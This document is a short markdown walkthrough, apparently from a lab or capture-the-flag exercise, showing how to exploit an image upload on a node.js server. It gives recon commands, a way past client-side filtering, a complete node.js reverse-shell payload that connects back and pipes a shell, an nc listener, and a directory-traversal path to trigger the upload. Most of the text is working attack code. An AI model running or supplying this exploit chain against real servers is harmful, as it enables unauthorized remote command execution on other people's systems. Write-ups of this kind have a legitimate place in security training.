# File Upload Exploit Walkthrough

## 1. Get Server Information
This information may expose what backend language is used. In this case it is node.js

```sh
curl -i -X HEAD 10.10.10.10
curl -i -X OPTIONS
```
## 2. Scan using gobuster
```sh
gobuster dir -u 10.10.10.10 -w wordlist.txt
/Content
/Assets
/Admin
```

## 3. Explore the image upload function
Upon inspecting the page we can see that `upload.js` is responsible for client side filtering. To bypass this we need to examine the request that is sent from javascript.

- Base64 encoded file
- Sent to domain root (/) as a json file
- Intercept request to match headers.

## 4. Upload a malicious payload
The server is using `node.js` so we'll craft a node.js reverse shell.

```js
(function(){
    var net = require('net'),
    cp = require('child_process'),
    sh = cp.spawn('sh',[]);

    var client = new net.Socket();
    client.connect(9001, '10.10.10.10', function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents crash
})();
```

## 5. Upload the malicious file
Backend filtering will change your uploaded file to a jpg. For simplicity i've only included 1 header and left the json file as a variable.

```sh
curl -i -H "Content-Type: application/json" -d "$json" 10.10.10.10 -vvvv
```

## 6. Confirm with gobuster
```sh
gobuster dir -u 10.10.10.10 -w wordlist.txt -x jpg
```

## 7. Start a local listener
On your local machine start a listener for the reverse shell.

```sh
nc -lvnp 9001
```

## 8. Load the shell from the admin console.
The admin console loads from modules. By using directory traversal we can load from another path (/content)

```sh
../content/XXX.jpg
```

This should create a connection back to the attacking machine.
